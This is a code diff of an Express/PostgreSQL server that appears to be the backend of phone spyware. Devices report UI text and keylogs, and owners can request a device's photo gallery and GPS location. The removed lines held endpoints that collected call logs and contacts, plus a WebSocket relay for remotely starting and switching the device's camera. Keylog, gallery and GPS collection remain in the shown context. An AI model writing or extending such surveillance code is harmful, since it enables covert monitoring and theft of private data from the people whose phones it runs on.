@@ -4,8 +4,6 @@ const { Pool } = require("pg");
 const bcrypt = require("bcrypt");
 const session = require("express-session");
 const pgSession = require("connect-pg-simple")(session);
-const http = require("http");
-const WebSocket = require("ws");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -29,6 +27,7 @@ app.use(
   })
 );
 
+// ================= DATABASE SETUP =================
 async function setupDatabase() {
   try {
     await pool.query(`
@@ -69,6 +68,7 @@ function requireLogin(req, res, next) {
   next();
 }
 
+// ================= AUTH =================
 app.post("/api/signup", async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -125,8 +125,6 @@ const deviceUIs = new Map();
 const galleryData = new Map();
 const galleryRequestFlags = new Map();
 const gpsRequestFlags = new Map();
-const callLogsData = new Map();
-const contactsData = new Map();
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -234,45 +232,6 @@ app.get("/api/ui", requireLogin, async (req, res) => {
   res.json(deviceUIs.get(deviceId) || { uiText: "", timestamp: 0 });
 });
 
-// ================= CALL LOGS & CONTACTS =================
-app.post("/api/calllogs", async (req, res) => {
-  try {
-    const { deviceId, deviceToken, callLogs } = req.body;
-    if (!deviceId || !deviceToken || !Array.isArray(callLogs)) return res.status(400).json({ error: "deviceId, deviceToken, callLogs array required" });
-    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
-    callLogsData.set(deviceId, callLogs);
-    res.json({ success: true });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save call logs." }); }
-});
-
-app.post("/api/contacts", async (req, res) => {
-  try {
-    const { deviceId, deviceToken, contacts } = req.body;
-    if (!deviceId || !deviceToken || !Array.isArray(contacts)) return res.status(400).json({ error: "deviceId, deviceToken, contacts array required" });
-    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
-    contactsData.set(deviceId, contacts);
-    res.json({ success: true });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save contacts." }); }
-});
-
-app.get("/api/calllogs", requireLogin, async (req, res) => {
-  const { deviceId } = req.query;
-  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
-  res.json(callLogsData.get(deviceId) || []);
-});
-
-app.get("/api/contacts", requireLogin, async (req, res) => {
-  const { deviceId } = req.query;
-  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) return res.status(403).json({ error: "Not your device." });
-  res.json(contactsData.get(deviceId) || []);
-});
-
 // ================= GALLERY =================
 app.post("/api/gallery/request", requireLogin, async (req, res) => {
   const { deviceId, count } = req.body;
@@ -356,75 +315,7 @@ setInterval(() => {
       keylogs.splice(i, 1);
     }
   }
-}, 60 * 60 * 1000);
-
-// ================= WEBSOCKET SIGNALING =================
-const server = http.createServer(app);
-const wss = new WebSocket.Server({ server });
-
-const rooms = new Map();
-
-wss.on("connection", (ws, req) => {
-  const urlParams = new URL(req.url, `http://${req.headers.host}`);
-  const deviceId = urlParams.searchParams.get("deviceId");
-  const role = urlParams.searchParams.get("role");
-
-  if (!deviceId) {
-    ws.close(4000, "deviceId required");
-    return;
-  }
-
-  const room = rooms.get(deviceId) || { device: null, viewers: new Set() };
-
-  if (role === "device") {
-    room.device = ws;
-  } else if (role === "viewer") {
-    room.viewers.add(ws);
-  } else {
-    ws.close(4000, "role must be device or viewer");
-    return;
-  }
-
-  ws.on("message", (message) => {
-    try {
-      const data = JSON.parse(message);
-      if (data.type === "signal") {
-        const signalData = data.data;
-        if (role === "device") {
-          room.viewers.forEach(viewer => {
-            if (viewer.readyState === WebSocket.OPEN) {
-              viewer.send(JSON.stringify({ type: "signal", from: "device", data: signalData }));
-            }
-          });
-        } else {
-          if (room.device && room.device.readyState === WebSocket.OPEN) {
-            room.device.send(JSON.stringify({ type: "signal", from: "viewer", data: signalData }));
-          }
-        }
-      } else if (data.type === "start_camera") {
-        if (room.device && room.device.readyState === WebSocket.OPEN) {
-          room.device.send(JSON.stringify({ type: "start_camera" }));
-        }
-      } else if (data.type === "switch_camera") {
-        if (room.device && room.device.readyState === WebSocket.OPEN) {
-          room.device.send(JSON.stringify({ type: "switch_camera" }));
-        }
-      }
-    } catch (e) { /* ignore */ }
-  });
-
-  ws.on("close", () => {
-    if (role === "device") {
-      room.device = null;
-      room.viewers.forEach(viewer => viewer.send(JSON.stringify({ type: "device_disconnected" })));
-    } else {
-      room.viewers.delete(ws);
-    }
-    if (!room.device && room.viewers.size === 0) {
-      rooms.delete(deviceId);
-    }
-  });
-});
+}, 60 * 60 * 1000); // প্রতি ১ ঘণ্টা পর পর
 
 // ================= PAGES =================
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
@@ -436,4 +327,4 @@ app.post("/api/logout", (req, res) => {
   req.session.destroy(() => { res.clearCookie("connect.sid"); res.json({ message: "Logged out." }); });
 });
 
-server.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, "0.0.0.0", () => console.log(`Server running on port ${PORT}`));
